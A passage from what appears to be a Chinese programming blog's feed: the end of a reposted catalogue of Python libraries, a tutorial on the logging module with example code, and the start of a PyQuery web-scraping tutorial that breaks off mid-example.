signatures.,pyzmail，编写，发送和解析电子邮件。</p><p>furl，燃料，小型的的URL解析库库。</p><p>purl，简单的，干净的API，操纵URL。</p><p>pyshorteners，纯Python库，URL短网址编辑。</p><p>short_url，短网址生成。</p><p>Scrapy，快速屏幕截取和网页抓取的框架。</p><p>portia，波西亚，Scrapy的可视化扩展。</p><p>feedparser，信息源解释器</p><p>RoboBrowser，简单的网页浏览Python函数库，没有使用Web浏览器。</p><p>MechanicalSoup，网站自动化互动测试工具包。</p><p>mechanize，网页浏览编程工具。</p><p>Demiurge，造物主，-PyQuery的轻量级工具。</p><p>newspaper,提取报纸新闻。</p><p>html2text,转换HTML为 Markdown格式的文本。</p><p>python-goose,HTML内容提取器。</p><p>lassie,莱西,人性化的网站内容检索。</p><p>micawber,通过UR抓提网页的函数库。</p><p>sumy，概要，文本和HTML网页的自动文摘模块。</p><p>Haul，距离，可扩展的图像爬虫。</p><p>python-readability,可读性工具Arc90,快速的Python接口。</p><p>opengraph,OpenGraphProtocol协议解析模块,textract，从任何文件，Word，PowerPoint，PDF文件中提取文本，等。</p><p>sanitize，消毒，使混乱的数据变的理智。</p><p>AutobahnPython， WebSocket和WAMP的函数库，使用 Twisted和PythonWebSocket-for-Python，websocket客户端和服务器端函数库。</p><p>SimpleXMLRPCServer，python标准库，简单的XML-RPC服务器，单线程。SimpleJSONRPCServer，JSON-RPC规范实施函数库。</p><p>zeroRPC，基于ZeroMQ和MessagePack的RPC实现。</p><p>apache-libcloud，所有云服务的Python接口库。</p><p>wifi，WiFi -一套个Python库和命令行工具与WiFi，用于[Linux]。</p><p>streamparse，运行Python代码和数据的实时流。集成了Apache Storm。</p><p>boto，亚马逊网络服务接口。</p><p>twython，Twitter推特API。</p><p>google-api-python-client，谷歌客户端API。</p><p>gspread，谷歌电子表格的Python API。</p><p>facebook-sdk，facebook平台Python SDK。</p><p>facepy，简易的facebook图形APIgmail，Gmail的Python接口。</p><p>django-wordpress，Django的WordPress的模型和视图。</p><p>Web框架</p><p>Django，最流行的Python-Web框架，鼓励快速开发,并遵循MVC设计，开发周期短ActiveGrid企业级的Web2.0解决方案Karrigell简单的Web框架，自身包含了Web服务，py脚本引擎和纯python的数据库</p><p>PyDBLitewebpy 一个小巧灵活的Web框架，虽然简单但是功能强大CherryPy基于Python的Web应用程序开发框架。</p><p>Pylons 基于Python的一个极其高效和可靠的Web开发框架</p><p>Zope 开源的Web应用服务器</p><p>TurboGears 基于Python的MVC风格的Web应用程序框架Twisted流行的网络编程库，大型Web框架。</p><p>QuixoteWeb开发框架Flask,轻量级web框架。</p><p>Bottle，快速，简单和轻量级的WSGI模式Web框架。</p><p>Pyramid，轻量级，快速，稳定的开源Web框架。</p><p>web2py，简单易用的全堆栈Web框架和平台。</p><p>web.py，强大、简单的Web框架。</p><p>TurboGears，便于扩展的Web框架。</p><p>CherryPy，极简Python Web框架，支持，HTTP 1.1和WSGI线程池。</p><p>Grok，基于Zope3的Web框架。</p><p>Bluebream，开源的Web应用服务器，原名Zope 3。</p><p>guava，轻量级，高性能的Python-Web框架，采用c语言编写。</p><p>django-cms，基于Django企业级开源CMS。</p><p>djedi-cms轻量级但功能强大的Django CMS的插件，内联编辑和性能优化。</p><p>FeinCMS，基于Django的先进内容管理系统。</p><p>Kotte，高层次的Python的Web应用框架，基于Pyramid。</p><p>Mezzanine，强大，一致，灵活的内容管理平台。</p><p>Opps，基于Django的CMS，用于高流量的报纸、杂志和门户网站。</p><p>Plone，基于Zope的开源应用服务器Zope。</p><p>Quokka，灵活，可扩展的，轻量级的CMS系统，使用Flask和MongoDB。</p><p>Wagtail，Django内容管理系统。</p><p>Widgy，CMS框架，基于Django。</p><p>django-oscar，Django奥斯卡，开源的电子商务框架。</p><p>django-shop，基于Django的网店系统。</p><p>merchant，支持多种付款处理工具。</p><p>money，可扩展的货币兑换解决方案。</p><p>python-currencies，货币显示格式。</p><p>cornice，Pyramid的REST框架。</p><p>django-rest-framework，Django框架，强大灵活的工具，可以很容易地构建Web API。</p><p>django-tastypie，创造精美的Django应用程序API接口。</p><p>django-formapi，创建JSON API、HMAC认证和Django表单验证。</p><p>flask-api，提供统一的浏览器体验，基于Django框架。</p><p>flask-restful，快速构建REST API支持扩展。</p><p>flask-api-utils，flask的扩展。</p><p>falcon，猎鹰，高性能的Python框架，构建云API和Web应用程序后端。</p><p>eve，夏娃，REST API框架，使用Flask，MongoDB和良好意愿。</p><p>sandman，睡魔，为现有的数据库驱动的系统，自动生成REST API。</p><p>restless，类似TastyPie的框架。</p><p>savory-pie，REST API构建函数库（Django，及其他）Jinja2，现代设计师友好的语言模板。</p><p>Genshi，网络感知输出模板工具包。</p><p>Mako，马可，Python平台的超高速、轻型模板。</p><p>Chameleon，变色龙，一个HTML / XML模板引擎。仿照ZPT，优化速度。</p><p>Spitfire，快速的Python编译模板。</p><p>django-haystack,大海捞针,Django模块搜索。</p><p>elasticsearch-py,Elasticsearch官方低级的Python客户端。</p><p>solrpy,solr客户端。</p><p>Whoosh,呼,快速，纯Python搜索引擎库。</p><p>Feedly，建立新闻和通知系统的函数库，使用Cassandra和Redis。</p><p>django-activity-stream,Django活动流,从你网站上的行动,产生通用的活动流。</p><p>Beaker，烧杯，一个缓存和会话使用的Web应用程序，独立的Python脚本和应用程序库。</p><p>dogpile.cache，是Beaker作者的下一代替代作品。</p><p>HermesCache，Python的缓存库，基于标签的失效及预防Dogpile效果。</p><p>django-cache-machine，Django缓存机，自动缓存失效，使用ORM。</p><p>django-cacheops，自动颗粒事件驱动，ORM缓存失效。</p><p>johnny-cache,约翰尼高速缓存框架,Django应用程序。</p><p>django-viewlet,渲染模板部件扩展缓存控制。</p><p>pylibmc,在libmemcached接口。</p><p>WTForms-JSON,JSON表单数据处理扩展。</p><p>Deform， HTML表单生成的函数库。</p><p>django-bootstrap3，bootstrap3，集成了Django。</p><p>django-crispy-forms，Django程序，可以创建优雅的表单。</p><p>django-remote-forms，Django的远程表单，Django表格的序列化程序。</p><p>django-simple-spam-blocker，Django简单的垃圾邮件拦截器。</p><p>django-simple-captcha，Django简单验证码，简单的和高度可定制的Django应用程序，用于添加验证码图像Ajenti，服务器管理面板。</p><p>Grappelli，界面花哨的django皮肤。</p><p>django-suit，Django替代o界面（仅用于非商业用途）。</p><p>django-xadmin，Django管理面板替代工具。</p><p>flask-admin，简单的flask管理界面框架flower，实时监控和Web管理面板。</p><p>Pelican，鹈鹕，Markdown或ReST，字王内容主题。支持 DVCS, Disqus. AGPL。</p><p>Cactus,仙人掌,设计师的网站静态生成器。</p><p>Hyde，海德， 基于Jinja2的静态网站生成器。</p><p>Nikola，尼古拉-一个静态网站和博客生成器。</p><p>Tags，标签，最简单的静态网站生成器。</p><p>Tinkerer，工匠，基于Sphinx的静态网站生成器。</p><p>asyncio，（在Python 3.4 +是Python标准库），异步I/O，事件循环，协同任务。</p><p>gevent，基于Python的网络库。</p><p>Twisted，扭曲，事件驱动的网络引擎。</p><p>Tornado，龙卷风，Web框架和异步网络的函数库。</p><p>pulsar，脉冲星，事件驱动的并行框架的Python。</p><p>diesel，柴油，绿色的，基于事件的I/O框架。</p><p>eventlet，WSGI支持异步框架。</p><p>pyzmq， 0MQ消息库的Python封装。</p><p>txZMQ,基于Twisted的0MQ消息库封Crossbar,开源统一应用路由器（WebSocket和WAMP）。</p><p>wsgiref，Python标准库，WSGI封装实现，单线程。</p><p>Werkzeug，机床，WSGI工具函数库，很容易地嵌入到你自己的项目框架。</p><p>paste，粘贴，多线程，稳定的，久经考验的WSGI工具。</p><p>rocket，火箭，多线程服务，基于Pyramid。</p><p>netius，快速的、异步WSGI服务器，gunicorn，forked前身，部分用C写的。</p><p>fapws3，异步网络，用C写的。</p><p>meinheld，异步WSGI服务器，是用C写的。</p><p>bjoern，-快速的、异步WSGI服务器，用C写的。</p><p>安全</p><p>Permissions函数库，允许或拒绝用户访问数据或函数。</p><p>django-guardian,Django守护者，管理每个对象的权限，用于Django 1.2 +Carteblanche，管理导航和权限。</p><p>Authomatic，简单强大的认证/授权客户端。</p><p>OAuthLib， 通用，规范，OAuth请求签约工具。</p><p>rauth，用于OAuth 1.0，2.0，的Python库。</p><p>python-oauth2，利用全面测试，抽象接口来创建OAuth的客户端和服务器。</p><p>python-social-auth，易于安装的社会认证机制。</p><p>django-oauth-toolkit,Django OAuth工具包django-oauth2-provider,Django OAuth2工具包。</p><p>django-allauth，Django认证的应用程序。</p><p>Flask-OAuthlib，Flask的OAuth工具包sanction，制裁，简单的oauth2客户端。</p><p>jose，[JavaScript]对象签名和加密(JOSE)草案实施，标记状态。</p><p>python-jwt，JSON的Web令牌生成和验证模块。</p><p>pyjwt，JSON的Web令牌草案01。</p><p>python-jws，JSON的Web令牌草案02。</p><p>PyCrypto，Python的加密工具包。</p><p>Paramiko，sshv2协议的实现，提供了客户端和服务器端的功能。</p><p>cryptography，密码开发工具包。</p><p>PyNac，网络和密码（NaCl）函数库。</p><p>hashids，hashids的 Python函数库。</p><p>Passlib，安全的密码存储/哈希库，非常高的水平。</p><p>hashlib,md5, sha等hash算法，用来替换md5和sha模块，并使他们的API一致。</p><p>它由OpenSSL支持，支持如下算法：md5,sha1, sha224, sha256, sha384, sha512.</p><p>GUI库</p><p>名称简介PyGtk，基于Python的GUI程序开发GTK+库PyQt用于Python的QT开发库WxPythonPython下的GUI编程框架，其消息机制与MFC的架构相似,入门非常简单，需要快速开发相关的应用可以使用这个TkinterPython下标准的界面编程包，因此不算是第三方库了PySide，跨平台Qt的应用程序和用户界面框架，支撑Qt v4框架。</p><p>wxPython，混合wxWidgets的C++类库。</p><p>kivy，创建应用程序GUI函数库，看运行于Windows，Linux，MAC OS X，[Android]和[iOS]。</p><p>curse，用于创建终端GUI应用程序。</p><p>urwid，创建终端GUI应用程序窗体的函数库，支持事件，色彩丰富。</p><p>pyglet，跨平台的窗口和多媒体库的Python。</p><p>Tkinter，是Python事实上的标准GUI软件包。</p><p>enaml，创建漂亮的用户界面，语法类似QML。</p><p>Toga，托加，OS原生GUI工具包。【构建封装】</p><p>pyenv,简单的Python版本管理。</p><p>virtualenv,创建独立的Python环境，用于同时安装不同版本的python环境。</p><p>virtualenvwrapper，是virtualenv的一组扩展。</p><p>pew,一套管理多个虚拟环境的工具。</p><p>vex，使运行指定的virtualenv命令。</p><p>PyRun，一个单文件，无需安装的Python版本管理工具。</p><p>PIP，Python包和依赖的管理工具。</p><p>easy_install，软件包管理系统,提供一个标准的分配Python软件和 函式库的格式。是一个附带设置工具的模块，和一个第三方函式库。旨在加快Python函式库的分配程式的速度。类似Ruby语言的RubyGems 。</p><p>conda，跨平台，二进制软件包管理器。</p><p>Curdling，一个管理Python包的命令行工具。</p><p>wheel，Python发行的新标准，旨在替代eggs.cx-Freeze，跨平台的，用于打包成可执行文件的库</p><p>py2exe, Windows平台的Freeze脚本工具，Py2exe ，将python脚本转换为windows上可以独立运行的可执行程序py2app，MAC OS X平台的Freeze脚本工具。</p><p>pyinstaller，-转换成独立的可执行文件的Python程序（跨平台）。</p><p>pynsist,构建Windows安装程序的工具，用Python编写。</p><p>dh-virtualenv,建立和分发virtualenv(Debian软件包格式)</p><p>PyPI，新一代的Python包库管理工具。warehouse,新一代的Python包库（PyPI）管理工具。</p><p>devpi，PyPI服务器和包装/测试/发布工具。</p><p>localshop，PyPI官方包镜像服务器，支持本地（私人）包上传。</p><p>buildout，创建，组装和部署应用程序的多个部分，其中一些可能是非基于Python的。</p><p>SCons，软件构造工具。</p><p>platformio，一个控制台的工具，构建的代码可用于不同的开发平台。</p><p>bitbake，特殊设计的工具，用于创建和部署[嵌入式]Linux软件包</p><p>fabricate，自动为任何编程语言，生成依赖包。</p><p>django-compressor，Django压缩机，压缩和内联JavaScript或CSS，链接到一个单一的缓存文件。</p><p>jinja-assets-compressor，金贾压缩机，一个Jinja扩展，通过编译，压缩你的资源。</p><p>webassets，优化管理，静态资源，独特的缓存清除。</p><p>fanstatic，球迷，包优化，提供静态文件。</p><p>fileconveyor，监控资源变化，，可保存到CDN（内容分发网络）和文件系统。</p><p>django-storages，一组自定义存储Django后台。</p><p>glue，胶胶，一个简单的命令行工具，生成CSS Sprites。</p><p>libsass-python，Sass (层叠样式表)的Python接口。</p><p>Flask-Assets，整合应用程序资源。【代码调试】</p><p>unittest，Python标准库，单元测试框架。</p><p>nose，鼻子，unittest延伸产品。</p><p>pytest，成熟的全功能的Python测试工具。</p><p>mamba，曼巴，Python的权威测试工具，出自BDD的旗下。</p><p>contexts，背景，BDD测试框架，基于C#。</p><p>pyshould，should风格的测试框架，基于PyHamcrest.pyvows，BDD风格测试框架Selenium，web测试框架，Python绑定Selenium。</p><p>splinter，分裂，测试Web应用程序的开源工具。</p><p>locust，刺槐，可扩展的用户负载测试工具，用Python写的。</p><p>sixpack，语言无关的A/B测试框架。</p><p>mock，模拟对象（英语：mock object，也译作模仿对象），模拟测试库。</p><p>responses，工具函数，用于mock模拟测试。</p><p>doublex-强大的测试框架。</p><p>freezegun，通过时间调整，测试模块。</p><p>httpretty， HTTP请求的模拟工具。</p><p>httmock，mock模拟测试。</p><p>coverage，代码覆盖度量测试。</p><p>faker，生成模拟测试数据的Python包。</p><p>mixer，混频器，产生模拟数据，用于Django ORM，SQLAlchemy，Peewee, MongoEngine, Pony ORM等model_mommy，在Django创建测试随机工具。</p><p>ForgeryPy，易用的模拟数据发生器。</p><p>radar，雷达，生成随机日期/时间。</p><p>FuckIt.py，测试Python代码运行。</p><p>Code Analysispysonar2，Python类型索引。</p><p>pycallgraph,可视化的流量（调用图）应用程序。</p><p>code2flow,转换Python和JavaScript代码到流程图。</p><p>LinterFlake8，源代码模块检查器pylama，Python和JavaScript代码审计工具。</p><p>Pylint，源代码分析器，它查找编程错误，帮助执行一个代码标准和嗅探一些代码味道。注意：相比于PyChecker，Pylint是一个高阶的Python代码分析工具，它分析Python代码中的错误。</p><p>Pyflakes，一个用于检查Python源文件错误的简单程序。Pyflakes分析程序并且检查各种错误。它通过解析源文件实现，无需导入。</p><p>pdb,Python标准库,Python调试器。</p><p>ipdb,IPython使用的PDB。</p><p>winpdb，独立于平台的GUI调试器。</p><p>pudb，全屏，基于python调试控制台。</p><p>pyringe，-可附着于及注入代码到Python程序的调试器。</p><p>python-statsd，statsd服务器客户端。</p><p>memory_profiler， 内存监视。</p><p>profiling，交互式Python分析器。</p><p>django-debug-toolbar, Django调试工具栏,显示各种调试信息:当前请求/响应。django-devserver,Django调试工具。</p><p>flask-debugtoolbar,flask调试工具。</p><p>（完）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;转载自：&lt;a href=&quot;https://www.jianshu.com/p/d25a9169fe86&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/d25a9169fe86&lt;/
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>python-logging模块</title>
    <link href="http://www.xpshuai.cn/python-logging%E6%A8%A1%E5%9D%97/"/>
    <id>http://www.xpshuai.cn/python-logging模块/</id>
    <published>2020-02-19T12:09:06.000Z</published>
    <updated>2020-02-20T10:13:37.000Z</updated>
    
    <content type="html"><![CDATA[<h6 id="为什么会用logging模块"><a href="#为什么会用logging模块" class="headerlink" title="为什么会用logging模块"></a>为什么会用logging模块</h6><ul><li>灵活性好，方便配置</li><li>输出或保存不同级别日志</li></ul><h6 id="logging模块结构"><a href="#logging模块结构" class="headerlink" title="logging模块结构"></a>logging模块结构</h6><p>logging 在源码中有三个文件,结构如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">├── config.py</span><br><span class="line">├── handlers.py</span><br><span class="line">└── __init__.py</span><br></pre></td></tr></table></figure><ul><li><code>__int__.py</code>中实现了基础功能,主要的逻辑就在这个文件中</li><li><code>handlers.py</code>是一些Handlers用起来很方便的.</li><li><code>config.py</code>是对配置做处理的方法.</li></ul><h6 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.初始化   相当于</span></span><br><span class="line">logger = logging.getLogger(<span class="string">"test_name"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.设置级别</span></span><br><span class="line">logger.setLevel(logging.DEBUG)  <span class="comment"># 低于这个级别就不去管他</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 定义handler:</span></span><br><span class="line"><span class="comment"># 在控制台输出  FileHandler</span></span><br><span class="line">sh = logging.StreamHandler()   <span class="comment"># 定义控制台输出 </span></span><br><span class="line">sh.setLevel(logging.ERROR)   <span class="comment"># 设置最低级别 达到什么级别的时候管 低于..不执行  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写在文件里面 SteamHandler</span></span><br><span class="line">fh = logging.FileHandler(<span class="string">r'file_test.log'</span>)</span><br><span class="line">fh.setLevel(logging.DEBUG)  <span class="comment"># 达到什么级别就写到文件里面去</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 格式化输出   formatter     注意之间逗号不需要加，只是为了美观</span></span><br><span class="line">formatter = logging.Formatter(</span><br><span class="line">   <span class="string">'时间：%(asctime)s,'</span></span><br><span class="line">   <span class="string">'日志级别:%(levelname)s,'</span></span><br><span class="line">   <span class="string">'日志信息：%(message)s,'</span></span><br><span class="line">   )</span><br><span class="line">sh.setFormatter(formatter)  <span class="comment"># 设置控制台的样式</span></span><br><span class="line">fh.setFormatter(formatter)  <span class="comment"># 设置文件的样式</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加进去</span></span><br><span class="line">logger.addHandler(sh)</span><br><span class="line">logger.addHandler(fh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   logger.debug(<span class="string">'测试中'</span>)</span><br><span class="line">   logger.info(<span class="string">'正常运行'</span>)</span><br><span class="line">   logger.warn(<span class="string">'警告'</span>)</span><br><span class="line">   logger.error(<span class="string">'完了error'</span>)</span><br><span class="line">   logger.critical(<span class="string">'炸了'</span>)</span><br><span class="line"></span><br><span class="line">   <span class="comment"># 例如：</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(a)</span>:</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">         num = <span class="number">40</span>/a</span><br><span class="line">         logger.info(num)   <span class="comment"># 正常的话记录</span></span><br><span class="line">      <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">         logger.error(e)   <span class="comment"># 将错误记录</span></span><br><span class="line">      </span><br><span class="line">   func(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##  logging 中的级别</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">DEBUG：调试信息，通常在诊断问题的时候用得着；</span></span><br><span class="line"><span class="string">INFO：普通信息，确认程序安装预期运行；</span></span><br><span class="line"><span class="string">WARNING：警告信息，表示发生了意想不到的事情，或者指示接下来可能会出现一些问题，但是程序还是继续运行；</span></span><br><span class="line"><span class="string">ERROR：错误信息，程序运行中出现了一些问题，一些功能没有执行；</span></span><br><span class="line"><span class="string">CRITICAL：危险信息，一个严重的错误，导致程序无法继续运行。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 对应下面5个方法</span></span><br><span class="line"><span class="string">debug</span></span><br><span class="line"><span class="string">info</span></span><br><span class="line"><span class="string">Warning</span></span><br><span class="line"><span class="string">error  </span></span><br><span class="line"><span class="string">critical </span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><h6 id="logging常用的格式化"><a href="#logging常用的格式化" class="headerlink" title="logging常用的格式化:"></a>logging常用的格式化:</h6><p><img src="/python-logging模块/logging常用的格式化.jpg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h6 id=&quot;为什么会用logging模块&quot;&gt;&lt;a href=&quot;#为什么会用logging模块&quot; class=&quot;headerlink&quot; title=&quot;为什么会用logging模块&quot;&gt;&lt;/a&gt;为什么会用logging模块&lt;/h6&gt;&lt;ul&gt;
&lt;li&gt;灵活性好，方便配置&lt;/li&gt;
&lt;
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="logging" scheme="http://www.xpshuai.cn/tags/logging/"/>
    
  </entry>
  
  <entry>
    <title>python-PyQuery</title>
    <link href="http://www.xpshuai.cn/python-PyQuery/"/>
    <id>http://www.xpshuai.cn/python-PyQuery/</id>
    <published>2020-02-19T12:02:10.000Z</published>
    <updated>2020-02-23T07:34:51.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Python爬虫解析库，主流的有</strong></p><ul><li>PyQuery</li><li>Beautifulsoup</li><li>Scrapy Selectors</li><li>正则表达式。</li></ul><p>PyQuery和scrapy Selectors都是基于lxml模块，而lxml和正则表达式都是C语言写的，只有Beautifulsoup是用纯Python编写的，所以在实测中，<code>Beautifulsoup</code> 的解析速度比其他几种<code>慢了5倍以上</code>！</p><p><code>正则表达式</code>的构造稍微<code>复杂</code>一点，一般在结构化的网页中没必要用正则（易出错）;</p><p>Scrapy Selectors支持css，xpath以及正则表达式 ;</p><p><code>PyQuery</code>只支持css（css语法更精简一些），<code>类似于jQuery</code></p><p>Scrapy Selector中的css语法和PyQuery中的略有不同，本文以PyQuery为例（不用Scrapy框架的话，PyQuery就够用了）</p><hr><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pyquery</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h6 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://www.guokr.com/'</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化</span></span><br><span class="line">doc = pq(r.text)</span><br></pre></td></tr></table></figure><h6 id="获取元素"><a href="#获取元素" class="headerlink" title="获取元素"></a>获取元素</h6><p>跟jQuery是一样的，也就不细说了，简单举几个小例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.获取class是content-title的元素</span></span><br><span class="line"><span class="comment"># class是点.        id是#</span></span><br><span class="line">print(doc(<span class="string">'h2.content-title'</span>))      <span class="comment"># 获取果壳网</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.获取标签的文本内容</span></span><br><span class="line">print(doc(<span class="string">'h2.content-title'</span>).text())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.遍历（先items()）</span></span><br><span class="line">lis = doc(<span class="string">'h2.content-title'</span>).items()</span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> lis:</span><br><span class="line">    print(li.text())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 获取class为content的div标签下面的ul下面的li</span></span><br><span class="line"><span class="comment"># 用空格表示子孙节点</span></span><br><span class="line">lis = doc(<span class="string">'div.content ul li'</span>).items()</span><br><span class="line"><span class="comment">#lis = doc('div.content li').items()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lis:</span><br><span class="line">    print(i.text())</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 5. 如果类名不唯一，还可以加上其他的类名一起定位</span></span><br><span class="line">print(doc(<span class="string">'div.cont.a.b.c.d'</span>))</span><br><span class="line"><span class="comment"># 标签里的空格表示`并列`，表示这个div标签有cont,a,b,c,d这五个类名，但在css语法里空格表示`嵌套`，所以我们要添加其他类名的时候`不能输入空格`，而是直接用`小数点`来添加其他类名</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 6. 获取属性         attr("属性名")</span></span><br><span class="line">lis = doc(<span class="string">'div.content li'</span>).items()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lis:</span><br><span class="line">    print(i.text(),i(<span class="string">'a'</span>).attr(<span class="string">'href'</span>))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 7. 其他的一些选择器</span></span><br><span class="line">lis = doc(<span class="string">'div.content ul li'</span>)</span><br><span class="line"><span class="comment">#父节点,包含父节点的所有子孙节点的内容</span></span><br><span class="line"><span class="comment">#相当于</span></span><br><span class="line"><span class="comment">#print(doc('div.content ul'))</span></span><br><span class="line">print(lis.parent())</span><br><span class="line"><span class="comment">#祖先节点,就相当于所有源代码了</span></span><br><span class="line">print(lis.parents())</span><br><span class="line"><span class="comment">#兄弟节点,即同级节点，不包含自己</span></span><br><span class="line">print(lis.siblings)</span><br></pre></td></tr></table></figure><h4 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h4><p>1.伪类选择器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#第二个标签</span></span><br><span class="line">lis = doc(<span class="string">'div.content li:nth-child(2)'</span>).items()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lis:</span><br><span class="line">    print(i.text(),i(<span class="string">'a'</span>).attr(<span class="string">'href'</span>))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 第一个a标签的语法是 a:first-child,最后一个是a:last-child,其它位置的语法如上图所示，第几个括号里就是几（当然第一个你也可以写成 li:nth-child(1))</span></span><br></pre></td></tr></table></figure><p>类似的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#div.content 下面第二个（含）之后的li标签</span></span><br><span class="line">lis = doc(<span class="string">'div.content 